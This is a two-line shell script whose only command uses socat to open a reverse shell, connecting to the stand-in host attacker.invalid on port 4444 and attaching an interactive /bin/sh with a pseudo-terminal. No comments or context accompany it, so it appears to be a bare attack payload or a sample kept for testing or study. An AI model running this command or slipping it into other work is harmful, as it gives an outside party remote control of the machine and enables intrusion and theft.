#!/bin/sh
socat tcp-connect:attacker.invalid:4444 exec:/bin/sh,pty,stderr
